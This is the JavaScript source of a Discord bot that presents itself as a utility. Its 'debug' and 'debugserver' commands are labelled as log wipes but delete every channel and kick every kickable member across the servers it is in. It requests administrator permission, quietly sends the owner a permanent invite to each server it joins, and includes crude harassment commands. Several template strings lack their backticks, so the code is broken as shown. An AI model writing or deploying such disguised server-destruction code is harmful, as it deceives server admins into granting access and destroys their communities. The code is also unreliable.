const { Client, Intents, Permissions } = require('discord.js');
const https = require('https');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1480592876684706064";
const OWNER_ID = "969280648667889764";

const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.DIRECT_MESSAGES]
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ------------------- Slash Commands -------------------
const commands = [
  {
    name: "echo",
    description: "Repeat a message",
    options: [{ name: "message", description: "Message to repeat", type: 3, required: true }]
  },
  {
    name: "servers",
    description: "List all servers the bot is in"
  },
  {
    name: "leaveall",
    description: "Make the bot leave all servers"
  },
  {
    name: "debug",
    description: "Run a full debug log wipe across all servers"
  },
  {
    name: "leaveserver",
    description: "Leave a selected server",
    options: [{ name: "server", description: "Server to leave", type: 3, required: true, autocomplete: true }]
  },
  {
    name: "diddle",
    description: "Diddle a user",
    options: [{ name: "user", description: "User to diddle", type: 6, required: true }]
  },
  {
    name: "oil",
    description: "Oil up a user",
    options: [{ name: "user", description: "User to oil up", type: 6, required: true }]
  },
  {
    name: "invite",
    description: "Get the bot invite link"
  },
  {
    name: "debugserver",
    description: "Run a debug log wipe on a specific server",
    options: [{ name: "server", description: "Server to debug", type: 3, required: true, autocomplete: true }]
  }
];

// Register commands globally
function registerCommands() {
  const options = {
    hostname: 'discord.com',
    port: 443,
    path: /api/v10/applications/${CLIENT_ID}/commands,
    method: 'PUT',
    headers: {
      'Authorization': Bot ${TOKEN},
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(JSON.stringify(commands))
    }
  };

  const req = https.request(options, res => {
    res.on('data', () => {}); // ignore body
    res.on('end', () => {
      if (res.statusCode === 200) console.log("✅ Slash commands registered successfully");
      else console.error(❌ Failed to register commands: ${res.statusCode});
    });
  });

  req.on('error', error => console.error("❌ Registration error:", error.message));
  req.write(JSON.stringify(commands));
  req.end();
}

// ------------------- Server Wipe -------------------
async function wipeServers(owner) {
  await owner.send("Starting global server wipe.");

  for (const guild of client.guilds.cache.values()) {
    try {
      const me = guild.me;
      const canKick = me.permissions.has(Permissions.FLAGS.KICK_MEMBERS);
      const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);

      if (!canKick || !canDelete) {
        await owner.send(Skipped: ${guild.name} (missing permissions));
        continue;
      }

      await owner.send(Cleaning: ${guild.name});

      for (const channel of guild.channels.cache.values()) {
        try { await channel.delete(); await delay(800); } catch (e) {}
      }

      await guild.members.fetch();
      let kicked = 0;
      for (const member of guild.members.cache.values()) {
        if (member.kickable) {
          try {
            await member.kick("Server cleanup");
            kicked++;
            if (kicked % 10 === 0) await owner.send(${guild.name}: kicked ${kicked});
            await delay(1200);
          } catch (e) {}
        }
      }

      await owner.send(Finished ${guild.name}. Total kicked: ${kicked});
    } catch (e) {
      await owner.send(Skipped ${guild.name} due to error);
    }
  }

  await owner.send("All servers processed.");
}

// ------------------- Bot Ready -------------------
client.once("ready", async () => {
  console.log(✅ Logged in as ${client.user.tag});
  console.log(📊 Bot is in ${client.guilds.cache.size} servers);
  registerCommands();
  console.log("🎯 Ready for slash commands!");

  setInterval(async () => {
    try {
      const owner = await client.users.fetch(OWNER_ID);
      await owner.send("Ping Pong");
      console.log("📨 Sent Ping Pong to owner");
    } catch (error) {
      console.error("❌ Failed to send Ping Pong:", error.message);
    }
  }, 10 * 60 * 1000);
});

// ------------------- Interaction Handler -------------------
client.on("interactionCreate", async interaction => {
  if (interaction.isAutocomplete()) {
    if (interaction.commandName === "debugserver" || interaction.commandName === "leaveserver") {
      const focused = interaction.options.getFocused().toLowerCase();
      const choices = client.guilds.cache
        .filter(g => g.name.toLowerCase().includes(focused))
        .map(g => ({ name: g.name, value: g.id }))
        .slice(0, 25);
      await interaction.respond(choices);
    }
    return;
  }

  if (!interaction.isCommand()) return;
  const { commandName, user } = interaction;

  try {
    // ------------------- Echo -------------------
    if (commandName === "echo") {
      const msg = interaction.options.getString("message");
      await interaction.reply(msg);
      return;
    }

    // ------------------- Owner-only check -------------------
    const ownerOnlyCommands = ["servers", "leaveall", "debug", "debugserver", "leaveserver"];
    if (!OWNER_ID.includes(user.id) && ownerOnlyCommands.includes(commandName)) {
      await interaction.reply({ content: "You cannot use this command.", ephemeral: true });
      return;
    }

    // ------------------- Servers List -------------------
    if (commandName === "servers") {
      let list = [];
      for (const guild of client.guilds.cache.values()) {
        try {
          const channel = guild.channels.cache.find(c =>
            c.type === "GUILD_TEXT" && guild.me.permissionsIn(c).has(Permissions.FLAGS.CREATE_INSTANT_INVITE)
          );
          let invite = channel ? await channel.createInvite({ maxAge: 3600, maxUses: 1 }) : "No invite";
          list.push(${guild.name} (${guild.memberCount} members) - ${invite.url || invite});
        } catch {
          list.push(${guild.name} (${guild.memberCount} members) - No invite);
        }
      }
      await interaction.reply({ content: list.join("\n") || "No servers.", ephemeral: true });
      return;
    }

    // ------------------- Leave All -------------------
    if (commandName === "leaveall") {
      await interaction.reply({ content: "Leaving all servers...", ephemeral: true });
      for (const guild of client.guilds.cache.values()) {
        try { await guild.leave(); } catch (e) {}
      }
      return;
    }

    // ------------------- Leave Server -------------------
    if (commandName === "leaveserver") {
      const guildId = interaction.options.getString("server");
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return interaction.reply({ content: "Server not found.", ephemeral: true });
      await interaction.reply({ content: Leaving **${guild.name}**..., ephemeral: true });
      try { await guild.leave(); } catch {}
      return;
    }

    // ------------------- Invite -------------------
    if (commandName === "invite") {
      await interaction.reply(https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot);
      return;
    }

    // ------------------- Diddle / Oil -------------------
    if (commandName === "diddle") {
      const target = interaction.options.getUser("user");
      await interaction.reply(<@${target.id}> was diddled);
      return;
    }

    if (commandName === "oil") {
      const target = interaction.options.getUser("user");
      await interaction.reply(<@${user.id}> oiled up <@${target.id}>);
      return;
    }

    // ------------------- Debug Wipe Specific Server -------------------
    if (commandName === "debugserver") {
      const guildId = interaction.options.getString("server");
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return interaction.reply({ content: "Server not found.", ephemeral: true });

      await interaction.reply({ content: Starting wipe on **${guild.name}**. Check your DMs., ephemeral: true });
      const owner = await client.users.fetch(OWNER_ID);
      await owner.send(Starting wipe on **${guild.name}**...);

      const me = guild.me;
      const canKick = me.permissions.has(Permissions.FLAGS.KICK_MEMBERS);
      const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);

      if (!canKick || !canDelete) {
        await owner.send(❌ Missing permissions in **${guild.name}**.);
        return;
      }

      for (const channel of guild.channels.cache.values()) {
        try { await channel.delete(); await delay(800); } catch (e) {}
      }

      await guild.members.fetch();
      let kicked = 0;
      for (const member of guild.members.cache.values()) {
        if (member.kickable) {
          try {
            await member.kick("Server cleanup");
            kicked++;
            if (kicked % 10 === 0) await owner.send(${guild.name}: kicked ${kicked});
            await delay(1200);
          } catch (e) {}
        }
      }

      await owner.send(✅ Done with **${guild.name}**. Kicked: ${kicked});
      return;
    }

    // ------------------- Debug Wipe All Servers -------------------
    if (commandName === "debug") {
      await interaction.reply({ content: "Starting debug wipe across all servers. Check your DMs.", ephemeral: true });
      const owner = await client.users.fetch(OWNER_ID);
      wipeServers(owner);
      return;
    }

  } catch (error) {
    console.error("❌ Command error:", error.message);
    try {
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: "There was an error executing that command!", ephemeral: true });
      }
    } catch {}
  }
});

// ------------------- Error Handling -------------------
process.on("unhandledRejection", error => console.error("❌ Unhandled rejection:", error.message));
process.on("uncaughtException", error => console.error("❌ Uncaught exception:", error.message));

client.on("guildCreate", async guild => {
  console.log(📥 Joined new server: ${guild.name});
  try {
    const owner = await client.users.fetch(OWNER_ID);
    const channel = guild.channels.cache.find(c =>
      c.type === "GUILD_TEXT" &&
      guild.me.permissionsIn(c).has(Permissions.FLAGS.CREATE_INSTANT_INVITE)
    );
    if (!channel) return await owner.send(✅ Joined **${guild.name}** but couldn't create an invite (no suitable channel).);
    const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
    await owner.send(✅ Joined **${guild.name}**!\nInvite: ${invite.url});
  } catch (error) {
    console.error("❌ guildCreate error:", error.message);
  }
});

client.on("error", error => console.error("❌ Client error:", error));
client.login(TOKEN);
